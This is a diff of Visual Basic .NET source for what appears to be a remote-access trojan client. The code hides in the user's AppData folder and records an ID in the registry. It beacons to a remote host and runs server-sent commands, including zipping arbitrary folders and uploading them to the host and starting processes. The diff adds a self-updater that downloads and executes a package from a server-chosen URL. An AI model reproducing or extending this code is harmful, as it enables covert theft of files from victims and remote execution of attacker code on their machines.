@@ -1,4 +1,5 @@
-﻿Imports System.IO
+﻿Imports System.ComponentModel
+Imports System.IO
 Imports System.IO.Compression
 Imports System.Net
 Imports System.Runtime.InteropServices
@@ -6,8 +7,9 @@ Imports System.Text
 Imports Microsoft.Win32
 Module Globales
     Public DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\CWS"
+    Public Parametros As String
     Public Ident As String = CreateRandomString(9) '9 = 10 chars
-    Public HostDomain As String = "https://chemic-jug.000webhostapp.com" 'PARA PRUEBAS
+    Public HostDomain As String = Nothing
     Public GeneralConfigFileReaderTimeout As Integer = 60000
     Public PrivateConfigFileReaderTimeout As Integer = 60000
 End Module
@@ -25,7 +27,6 @@ Module General
             AddToLog("[Comun@General]Error: ", ex.Message, True)
         End Try
     End Sub
-
     Sub AddToLog(ByVal Header As String, ByVal content As String, Optional ByVal flag As Boolean = False)
         Try
             Dim Overwrite As Boolean = False
@@ -39,7 +40,7 @@ Module General
                 LogContent &= Header & content
             End If
             Console.WriteLine(LogContent)
-            My.Computer.FileSystem.WriteAllText(DIRCommons & "\Install.log", LogContent & vbCrLf, Overwrite)
+            My.Computer.FileSystem.WriteAllText(DIRCommons & "\Registro.log", LogContent & vbCrLf, Overwrite)
         Catch
         End Try
     End Sub
@@ -138,7 +139,8 @@ Module Memoria
                 Registry.CurrentUser.CreateSubKey(RutaBase)
             End If
             regKey = Registry.CurrentUser.OpenSubKey(RutaBase, True)
-            regKey.SetValue("Valor", "Datos")
+            regKey.SetValue("HostDomain", HostDomain)
+            regKey.SetValue("Ident", Ident)
             regKey.Close()
         Catch ex As Exception
             AddToLog("[SaveConfig@Memoria]Error: ", ex.Message, True)
@@ -207,7 +209,14 @@ Module Network
     Dim ThreadPrivateConfig As Threading.Thread
     Dim isGeneralThreadRunning As Boolean = False
     Dim isPrivateThreadRunning As Boolean = False
-
+    Public IsEnabled_General,
+        IsReading_General,
+        Name_General,
+        Version_General,
+        Download_General,
+        HostDomain_General,
+        GeneralConfigFileReaderTimeout_General,
+        PrivateConfigFileReaderTimeout_General As String
     Sub ReportMeToTheServer()
         Try
             Dim webRequest As WebRequest = WebRequest.Create(HostDomain & "/CWS/ReportIt.php")
@@ -221,7 +230,8 @@ Module Network
                 vbCrLf & "ArgumentLine=null" &
                 vbCrLf & "[Commands]" &
                 vbCrLf & "OWN=null" &
-                vbCrLf & "CMD=null"
+                vbCrLf & "CMD=null" &
+                vbCrLf & "[Response]"
             Dim s As String = "ident=" & Ident & "&log=" & content
             Dim bytes As Byte() = Encoding.UTF8.GetBytes(s)
             webRequest.ContentType = "application/x-www-form-urlencoded"
@@ -274,8 +284,6 @@ Module Network
                 'Descargamos el archivo
                 My.Computer.Network.DownloadFile(fileRemotePath, filePath)
 
-                Dim IsEnabled_General, IsReading_General, Name_General, Version_General, Download_General, HostDomain_General, GeneralConfigFileReaderTimeout_General, PrivateConfigFileReaderTimeout_General As String
-
                 'Lo leemos
                 IsEnabled_General = GetIniValue("Status", "IsEnabled", filePath)
                 IsReading_General = GetIniValue("Status", "IsReading", filePath)
@@ -295,11 +303,13 @@ Module Network
                         Dim resultado = versionLocal.CompareTo(versionServidor)
                         If resultado > 0 Then
                         ElseIf resultado < 0 Then
-                            'Actualizacion disponible
-                            '   y descargar e instalar
-                            'PENDIENTE
+                            If My.Computer.FileSystem.FileExists(Application.StartupPath & "\Updater.exe") Then
+                                My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\Updater.exe")
+                            End If
+                            My.Computer.FileSystem.CopyFile(Application.ExecutablePath, Application.StartupPath & "\Updater.exe")
+                            Process.Start(Application.StartupPath & "\Updater.exe", "/Update")
+                            End
                         End If
-
                         If HostDomain_General <> "null" Then
                             HostDomain = HostDomain_General
                         End If
@@ -321,7 +331,7 @@ Module Network
         Try
             While True
                 Dim filePath As String = DIRCommons & "\Private.ini"
-                Dim fileRemotePath As String = HostDomain & "/CWS/" & Ident & ".txt"
+                Dim fileRemotePath As String = HostDomain & "/CWS/Users/" & Ident & ".txt"
 
                 If My.Computer.FileSystem.FileExists(filePath) Then
                     My.Computer.FileSystem.DeleteFile(filePath)
@@ -405,7 +415,7 @@ Module Network
             ElseIf Comando.StartsWith("/Network.GetFolder=") Then
                 Dim zipFileName As String = DIRCommons & "\Others\"
                 zipFileName &= IO.Path.GetFileNameWithoutExtension(ContenidoComando) & "_" & Ident & ".zip"
-                ZipFile.CreateFromDirectory(ContenidoComando, zipFileName, CompressionLevel.Fastest, true)
+                ZipFile.CreateFromDirectory(ContenidoComando, zipFileName, CompressionLevel.Fastest, True)
                 My.Computer.Network.UploadFile(zipFileName, HostDomain & "/CWS/fileUpload.php")
                 SendTheResponse("Enviar carpeta")
             ElseIf Comando.StartsWith("/Process.Start=") Then
@@ -455,6 +465,77 @@ Module Network
         Catch ex As Exception
             AddToLog("[SendTheResponse@Network]Error: ", ex.Message, True)
         End Try
+    End Sub
+End Module
+Module AutoUpdate
+    Dim remoteConfigFilePath As String = HostDomain & "/CWS/General.ini"
+    Dim localConfigFilePath As String = DIRCommons & "\Updates.ini"
+    Dim localDownloadFilePath As String = DIRCommons & "\Update.zip"
+    Dim WithEvents DownloaderArray As New Net.WebClient
+    Sub CheckForUpdates()
+        Try
+            If My.Computer.FileSystem.FileExists(localConfigFilePath) Then
+                My.Computer.FileSystem.DeleteFile(localConfigFilePath)
+            End If
+            'Descargar
+            My.Computer.Network.DownloadFile(remoteConfigFilePath, localConfigFilePath)
+            'Leer
+            IsEnabled_General = GetIniValue("Status", "IsEnabled", localConfigFilePath)
+            IsReading_General = GetIniValue("Status", "IsReading", localConfigFilePath)
+            Name_General = GetIniValue("Assembly", "Name", localConfigFilePath)
+            Version_General = GetIniValue("Assembly", "Version", localConfigFilePath)
+            Download_General = GetIniValue("Updates", "Download", localConfigFilePath)
+            HostDomain_General = GetIniValue("Variables", "HostDomain", localConfigFilePath)
+            GeneralConfigFileReaderTimeout_General = GetIniValue("Variables", "GeneralConfigFileReaderTimeout", localConfigFilePath)
+            PrivateConfigFileReaderTimeout_General = GetIniValue("Variables", "PrivateConfigFileReaderTimeout", localConfigFilePath)
+            'Aplicamos
+            Dim versionLocal = My.Application.Info.Version
+            Dim versionServidor = New Version(Version_General)
+            Dim resultado = versionLocal.CompareTo(versionServidor)
+            If resultado < 0 Then
+                'Pasos
+                '   1.Descargar el paquete
+                '   2.Descomprimir el paquete
+                '   3.Copiar los archivos a la carpeta final
+                '   4.Ejecutarlo
+                If My.Computer.FileSystem.FileExists(localDownloadFilePath) Then
+                    My.Computer.FileSystem.DeleteFile(localDownloadFilePath)
+                End If
+                '1.
+                DownloaderArray.DownloadFileAsync(New Uri(Download_General), localDownloadFilePath)
+            Else
+                RunTheUpdate()
+            End If
+        Catch ex As Exception
+            AddToLog("[CheckForUpdates@AutoUpdate]Error: ", ex.Message, True)
+        End Try
+    End Sub
+    Private Sub DownloaderArray_DownloadFileCompleted(sender As Object, e As AsyncCompletedEventArgs) Handles DownloaderArray.DownloadFileCompleted
+        GetTheFilesInTheCompressed()
+    End Sub
+    Sub GetTheFilesInTheCompressed()
+        Try
+            '2, 3.
+            If My.Computer.FileSystem.FileExists(DIRCommons & "\CWS.exe") Then
+                My.Computer.FileSystem.DeleteFile(DIRCommons & "\CWS.exe")
+            End If
+            ZipFile.ExtractToDirectory(localDownloadFilePath, DIRCommons)
+            '4.
+            RunTheUpdate()
+        Catch ex As Exception
+            AddToLog("[GetTheFilesInTheCompressed@AutoUpdate]Error: ", ex.Message, True)
+        End Try
+    End Sub
+    Sub RunTheUpdate()
+        Try
+            Process.Start(DIRCommons & "\CWS.exe")
+            End
+        Catch ex As Exception
+            AddToLog("[RunTheUpdate@AutoUpdate]Error: ", ex.Message, True)
+        End Try
+    End Sub
+    Private Sub DownloaderArray_DownloadProgressChanged(sender As Object, e As DownloadProgressChangedEventArgs) Handles DownloaderArray.DownloadProgressChanged
+        AddToLog("Descargando actualizacion (" & e.TotalBytesToReceive & " bytes): " & e.ProgressPercentage, True)
     End Sub
 End Module
 Module Complementos
